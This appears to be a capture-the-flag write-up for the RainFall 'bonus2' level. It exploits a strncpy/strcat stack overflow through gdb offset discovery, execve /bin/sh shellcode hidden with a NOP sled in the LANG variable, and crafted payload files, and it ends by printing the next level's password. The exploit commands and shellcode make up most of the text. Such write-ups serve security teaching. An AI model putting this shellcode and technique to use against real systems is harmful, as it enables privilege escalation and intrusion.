## BONUS 2

Ressources:
- [Disassembled code](disassembled_code.md)
- [Source code](srcs/bonus2.c)

In this program, we have two functions `main()` and `greetuser()`. `main()` concatenates use `strncpy()` on `av[1]` and `av[2]` to concatenates those two strings in a buffer of 72 bytes, then it will search the environment variable `LANG` if it has been found and `LANG` start with `fi` the language value is 1, if LANG start with `nl` the language value is 2 and if LANG has not been found the language value is 0. Depending of the language value, `greetuser()` will concatenates a different message in a buffer with the previous string.

For exemple if a set `fi` as `LANG` value, the program will print:

``` shell
bonus2@RainFall:~$ ./bonus2 "Hey" "HowAreYou"
Hyvää päivää Hey
```

The program did not concatenates the two strings because it use `strncpy(..., 40)` that's means that if our string is not longer than 40 characters, it end up with a NULL character. So to create a string of size 72 we have to set a string longer than 40 characters.

```shell
./bonus2 $(python -c 'print ("A"*40)') "HowAreYou"
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHowAreYou
```

Perfect, if we take a look on the function `greetuser()` we can see that the function concatenates a message depending on the `language` value with the previous buffer. So we can try to overflow it.

```shell
bonus2@RainFall:~$ ./bonus2 $(python -c 'print ("A"*40)') $(python  -c 'print ("B"*32)')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Segmentation fault (core dumped)
```

Excellent, we just have to use a **Buffer Overflow Attack**. But as many times before we need some informations before creating the payload.

**For all the information I will find, I will use an environment variable starting with `fi`.**

---

#### EIP

```shell
bonus2@RainFall:~$ gdb -q bonus2
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
(gdb) r $(python -c 'print ("A"*40)') "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
Starting program: /home/user/bonus2/bonus2 $(python -c 'print ("A"*40)') "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? ()
```

The EIP offset is size of **18**.

---

#### Shellcode

I will use the same Shellcode as in the previous levels.

`\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`

But to this level we will use a different technique because we will inject the Shellcode in a environment variable.

`export LANG=$(python -c 'print("fi" + "\x90" * 200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')`

---

#### ShellCode address

Now we need to know where this address is store.

```shell
(gdb) x/32s *((char **)environ)
0xbffff85b:	 "SHELL=/bin/bash"
0xbffff86b:	 "TERM=xterm-256color"
0xbffff87f:	 "SSH_CLIENT=192.168.56.1 63733 4242"
[...]
0xbffffe60:	 "PWD=/home/user/bonus2"
0xbffffe76:	 "LANG=fi\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311\315\200"
0xbffffef7:	 "LINES=52"
[...]
0xbffffffe:	 ""
```

Now we know that our variable is at the address `0xbffffe76` but i gonna add 16 bits to be sure. 

`0xbffffe76 + 0x10 = 0xbffffe86`

---

### Payload

We can now create our payloads.

`python -c 'print("\x90"*40)' > /tmp/payload_1`

`python -c 'print("\x90"*18 + "\x86\xfe\xff\xbf")' > /tmp/payload_2`'`

Perfect, we just have to inject the payloads into the program.

```shell
bonus2@RainFall:~$ ./bonus2 $(cat /tmp/payload_17) $(cat /tmp/payload_27)
Hyvää päivää ��������������������������������������������������������������
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```





